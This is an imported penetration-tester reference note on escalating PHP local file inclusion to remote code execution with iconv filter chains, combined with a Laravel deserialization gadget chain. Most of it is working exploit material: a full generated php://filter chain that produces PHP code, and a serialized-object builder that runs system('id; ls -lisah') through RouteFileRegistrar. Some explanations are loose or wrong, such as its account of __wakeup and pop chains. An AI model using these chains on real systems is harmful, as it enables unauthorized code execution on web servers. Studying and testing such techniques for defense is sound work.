---
technique: "PHP filter chain (LFI\u2192 RCE)"
family: "ssrf-xxe-file"
severity_hint: "critical"
tags: ["PHP", "Remote Code Execution", "Deserialization", "HTTP"]
source: "_raw/Web attacks/Web Attacks/PHP filter chain (LFI\u2192 RCE).md"
source_sha256: "e0fef96a1a851134ff6f16f7a0786c9748657f9b6f1a46f2164f168df4ff9a1d"
curator_version: 2
review_status: imported-unreviewed
---

# PHP filter chain (LFI→ RCE)

> Family: **ssrf-xxe-file** · Severity hint: **critical** · Tags: PHP, Remote Code Execution, Deserialization, HTTP
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: python3.

## Quick index — payloads & commands in this note
- `php: $somewhere->unserialize($controlled);`
- `php: # Since we controll the unserialized data we can use any Class to call`
- `php: # They found this class implementing a register method`
- `php: $ iconv -l`
- `php: $url = "php://filter/convert.iconv.UTF-8%2fUTF-7/resource=data:,some<>text";`
- `php: <?php`
- `php: $ php -r "echo base64_encode('base64');"`
- `php: $ echo 'YmFzZTY0' > test.txt`
- `php: $ php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.UTF7/convert.base64-deco`
- `php: <?php`
- `php: $ php iso_2022_7bits_encodings.php`
- `php: <?php`
- `php: $ php prepend8.php`
- `php: conversions = {`
- `php: ❯ php -r "echo require('php://temp');"`
- `php: $ python3 php_filter_chain_generator.py --chain '<?php phpinfo();  ?> '`
- `php: <?php`
- `php: class PendingResourceRegistration`
- `php: class RouteFileRegistrar`
- `php: class RouteFileRegistrar`
- `php: $this->router[0] = "system";`

## Playbook (operator notes)

# PHP filter chain (LFI→ RCE)

[https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

[PHP filters chain: What is it and how to use it](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it)

[](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)

<aside>
👉🏽

In cybersecurity, a "pop chain" typically refers to a specific type of exploit chain or attack sequence related to Return-Oriented Programming (ROP) techniques.
A pop chain is a sequence of gadgets (small snippets of existing code) that manipulate the stack by using "pop" instructions to control register values or bypass security mechanisms. The "pop" instruction in assembly language removes values from the stack and places them into registers.

</aside>

# PHP Magic methods

### `__wakeup`

Called when deserialization does not work

### `__destruct`

Called when the object is destructed or the script is stopped or exited

# Larvel (Deserialization)

/image.png)

```php
$somewhere->unserialize($controlled);
```

```php
# Since we controll the unserialized data we can use any Class to call
# They found this chain
<?php
namespace Illuminate\Routing;
use Illuminate\Support\Arr;
use Illuminate\Support\Traits\Macroable;

class PendingResourceRegistration
{
        $this->name = $name;
        $this->options = $options;
        $this->registrar = $registrar; # Arbitrary object
        $this->controller = $controller;
[...]

    public function register()
    {
        $this->registered = true;

        return $this->registrar->register(
            $this->name, $this->controller, $this->options
        ); # We call the register method of an arbitrary object
    }
[...]
    public function __destruct()
    {
        if (! $this->registered) {
            $this->register();
        }
    }
}
```

```php
# They found this class implementing a register method
# Here we can controll the router class value
# And on top there is a permissive require
# They state this is LFI while i do not quite understand how they read the files contents with this
<?php
namespace Illuminate\Routing;

class RouteFileRegistrar
{
    protected $router;
[...]
    public function register($routes)
    {
        $router = $this->router;
        require $routes;
    }
}
```

## PHP-Filter iconv (excourse)

[Surprising CTF task solution using php://filter](https://gynvael.coldwind.pl/?id=671)

*Challange:* 

Upload an image containing a PHP script at the end due to upload function restrictions. It was not possible because `.pht` extension was missed trying out.

*Plan:*

He found the iconv php filter, where the idea was to convert the contents of `/flag` in the filesystem to an image so that the application would accept it. `php://filter/convert.iconv.*CHARSET1*%2f*CHARSET2*/resource=/flag` 

Lets you convert strings from charset A to charset B

```php
$ iconv -l
The following list contains all the coded character sets known.  This does
not necessarily mean that all combinations of these names can be used for
the FROM and TO command line parameters.  One coded character set can be
listed with several different names (aliases).
 437, 500, 500V1, 850, 851, 852, 855, 856, 857, 860, 861, 862, 863, 864, 865,
 866, 866NAV, 869, 874, 904, 1026, 1046, 1047, 8859_1, 8859_2, 8859_3, 8859_4,
 8859_5, 8859_6, 8859_7, 8859_8, 8859_9, 10646-1:1993, 10646-1:1993/UCS4,
...
 WINDOWS-31J, WINDOWS-874, WINDOWS-936, WINDOWS-1250, WINDOWS-1251,
 WINDOWS-1252, WINDOWS-1253, WINDOWS-1254, WINDOWS-1255, WINDOWS-1256,
 WINDOWS-1257, WINDOWS-1258, WINSAMI2, WS2, YU
```

```php
$url = "php://filter/convert.iconv.UTF-8%2fUTF-7/resource=data:,some<>text";
echo file_get_contents($url);

// Output:
// some+ADwAPg-text
```

He ran the script and got:

`IBM1154 UTF-32BE`

```php
<?php
$d = file_get_contents(
 "php://filter/convert.iconv.UTF-32BE%2fIBM1154/resource=".
 "data:image/png;base64,AAAEWAAAACsAAARbAAAAIwAABFsAAAA/AA".
 "AAKAAAAC8AAAA+AAAAYAAABCoAAAQFAAAEAwAABAYAAAAlAAAALwAABD".
 "AAAACtAAAEUwAAAC8AAAA+AAAEDgAABAMAAAQFAAAEBwAAAD8AAAA/AA".
 "AEBAAABAYAAAA/AAAEDAAAAGAAAAA/AAAEDwAAACcAAACO");
echo $d;

---

php wtf.php
INS{SoManyWebflawsCantbegoodforyou}

---

php://filter/convert.iconv.IBM1154%2fUTF-32BE/resource=/flag
```

## Escalate this to RCE

## B64

Ignores invalid chars and works as if they did not exists.

```php
$ php -r "echo base64_encode('base64');"
YmFzZTY0

$ php -r "echo base64_decode('YmFzZTY0');"
base64

$ php -r "echo base64_decode('@_>YmFzZTY0');"
base64

$ echo '@_>YmFzZTY0' > test.txt

$ php -r "echo file_get_contents('php://filter/convert.base64-decode/resource=test.txt');"
base64
```

Even if the PHP `base64-decode` filter and `base64_decode` function are really close in their behavior, there is a difference between them regarding the way the '=' character is interpreted

```php
$ echo 'YmFzZTY0' > test.txt

$ php -r "echo file_get_contents('php://filter/convert.base64-decode/resource=test.txt');"
base64

$ php -r "echo base64_decode('YmFzZ==TY0');"
base64

$ echo 'YmFzZ==TY0' > test.txt
$ php -r "echo file_get_contents('php://filter/convert.base64-decode/resource=test.txt');"
Warning: file_get_contents(): stream filter (convert.base64-decode): invalid byte sequence in Command line code on line 1

$ echo 'YmFzZTY0==' > test.txt
$ php -r "echo file_get_contents('php://filter/convert.base64-decode/resource=test.txt');"
Warning: file_get_contents(): stream filter (convert.base64-decode): invalid byte sequence in Command line code on line 1
```

To fix this, we have to get rid of the `=` . One solution is to use `UTF-7` to convert those into chars 

`base64-decode` works with.

```php
$ php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.UTF7/convert.base64-decode/resource=test.txt');"
base64���
```

### Prepend chars

Example: ISO-2022-KR, a message has to start with the sequence "*ESC $ ) C*".

ISO-2022-KR is the only one prepending characters with the `iconv` PHP function

```php
<?php

$iso_2022_7bits_encodings = array('ISO-2022-CN', 'ISO-2022-CN-EXT', 'ISO-2022-JP', 'ISO-2022-JP', 'ISO-2022-JP-2', 'ISO-2022-KR');

foreach ($iso_2022_7bits_encodings as $elem){
	echo "[$elem] : hex ["; 
	echo bin2hex(iconv('UTF8',$elem, 'START'))."]\n";
}

```

```php
$ php iso_2022_7bits_encodings.php 
[ISO-2022-CN] : hex [5354415254]
[ISO-2022-CN-EXT] : hex [5354415254]
[ISO-2022-JP] : hex [5354415254]
[ISO-2022-JP] : hex [5354415254]
[ISO-2022-JP-2] : hex [5354415254]
[ISO-2022-KR] : hex [1b2429435354415254]
```

The following table recaps what was discussed on ISO/IEC 2022 and Unicode encodings. Those will prepend characters without breaking the integrity of a base64 string, making them usable in PHP filter chains.

| **Encoding identifier** | **Prepended characters** |
| --- | --- |
| ISO2022KR | \x1b$)C |
| UTF16 | \xff\xfe |
| UTF32 | \xff\xfe\x00\x00 |

### **Example: prepend 8 to your chain**

Each conversion alias is directly linked to a table containing the printable characters linked to it. We aim to jump from a table to another to get a specific character. In order to prepend an 8 we will require the iso8859-10 (covering Scandinavian languages) and UNICODE tables.

/image%201.png)

As illustrated above, prepending an 8 can be achieved in 3 steps:

- **Convert a string to UTF16 to prepend '*\xff\xfe*'**
- **Convert the created string to latin6, *'\xff*' is equivalent to the latin character kra 'ĸ'**
- **Convert the string back to UTF16 where the character 'ĸ' is equivalent to *'\x01\x38*'**
- **Finally, the chain will be interpreted character by character when printed, so '*\x38*' becomes *'8*'**

/image%202.png)

/image%203.png)

```php
<?php
$return = iconv( 'UTF8', 'UTF16', "START");
echo(bin2hex($return)."\n");
echo($return."\n");
$return2 = iconv( 'LATIN6', 'UTF16', $return);
echo(bin2hex($return2)."\n");
echo($return2."\n");
```

```php
$ php prepend8.php
fffe53005400410052005400
��START
fffe3801fe005300000054000000410000005200000054000000
��8�START
```

/image%204.png)

First we have `0xff`, `0xfe` generating ��

Then we have `0x38` which is the digit 8

Then we have `0x01` which is a control char, and not visible

Then we have `0xfe` which generates �

Then we have extra `0` padding

### First try to automate this

[LFI2RCE via PHP Filters - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html#improvements)

This script does not validate the integrity of the other chars from the initial string, weather present or not. On Hacktricks, there is a list of brute forced characters which seems promising, but it just cannot work on a full chain and the reason is quite interesting! Let's illustrate with this chain by prepending a 'b' to a string:

```php
conversions = {
[...]
 'b': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP1399.UCS4',
[...]
}
```

As we can see, the CP1399 codec is used, which is an alias to one of the Japanese version of the Extended Binary Coded Decimal Interchange Code (EBCDIC). It is used as a conversion table on this chain (really close to the IBM 1027 codec). This encoding was used on IBM systems. However, according to the Wikipedia page [[EBCDIC-WIKI]](https://en.wikipedia.org/wiki/EBCDIC), there were compatibility issues between EBCDIC and ASCII. Indeed, as we can see in the following table, the hex value 42 is not the character 'B', but ｡ in EBCDIC.

/image%205.png)

/image%206.png)

The UCS4 codec was not detailed here because it is really close to UTF32. It will only prepend null bytes on each character. **So the character 'b' is successfully prepended, but the content is also changed, including the content you already have generated.**

## Continuing

One of the main issues this trick had was the requirement of knowing a valid file path to include/require on the PHP wrapper. This is no longer the case because PHP wrappers allow to nest one to another!

```php
❯ php -r "echo require('php://temp');"
1

$ php -r "echo require('php://filter/convert.base64-decode/resource=php://temp');"
1
```

By using the PHP wrapper `php://temp` as the input resource of the whole filters chain, it is no longer necessary to guess a valid path on the target's file system, which depends on the operating system. It also won't be necessary to guess a path that is allowed by `open_basedir` directives.

### Script

```php
$ python3 php_filter_chain_generator.py --chain '<?php phpinfo();  ?> '
[+] The following gadget chain will generate the following code : <?php phpinfo();  ?>  (base64 value: PD9waHAgcGhwaW5mbygpOyAgPz4g)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

## Combining everything

/image%207.png)

```php
<?php
namespace Illuminate\Routing;

class RouteFileRegistrar
{
    protected $router;
    public function __construct(){
        $this->router[0] = "system";
        $this->router[1] = "id; ls -lisah";
    }
}

class PendingResourceRegistration
{
    protected $registrar;
    protected $name;
    protected $controller;
    protected $options;
    protected $registered;

    public function __construct(){
        $this->registrar = new RouteFileRegistrar();
        //<?=call_user_func($router[0], $router[1]);   ?> 
        <-- <?= short hand for <?php echo -->
        <-- call_user_func — Call the callback given by the first parameter -->
        <-- Generated via CLI tool -->
        $this->name = "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|[...]|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp";
        $this->controller = "test.php";
        $this->options = [];
        $this->registered = false;
    }
}

$test= serialize(new PendingResourceRegistration());
echo base64_encode(serialize(new PendingResourceRegistration()));
echo "\n";
```

## Notes on how this works

```php
class PendingResourceRegistration
{
		public function register()
		{
		    $this->registered = true;
		
		    return $this->registrar->register(
		        $this->name, $this->controller, $this->options
		    ); # We call the register method of an arbitrary object
		}
}
```

```php
class RouteFileRegistrar
{
    protected $router;

    public function __construct(){
        $this->router[0] = "system";
        $this->router[1] = "id; ls -lisah";
    }
}
```

```php
class RouteFileRegistrar
{
    protected $router;

    public function register($routes)
    {
        $router = $this->router;
        require $routes;
    }
}
```

When executing, the registrar `RouteFileRegistrar` will be called with argument `$routes` or in our case `$this->name = "php://filter/convert.iconv.UTF8.CSISO2022KR|...` 

This php filter generates a “php file”, with contents set to what was specified in the CLI argument. So basically we can generate arbitrary imaginary `.php` files as input, and thus, execute code via in this case `<?=call_user_func($router[0], $router[1]);` which basically does `<?php echo call_user_func(..);` . Hence `require php://filter/...` will then execute the imaginary php file and the generated contents via the conversion trick.

The `$router` serves as a placeholder for our variables that we need to pass into the function `($router[0], $router[1])`. 

Via:

```php
$this->router[0] = "system";
$this->router[1] = "id; ls -lisah";
```

We can then specify the variables verry easily for the user function generated by the php filters.

## Source
Original note: `_raw/Web attacks/Web Attacks/PHP filter chain (LFI→ RCE).md`
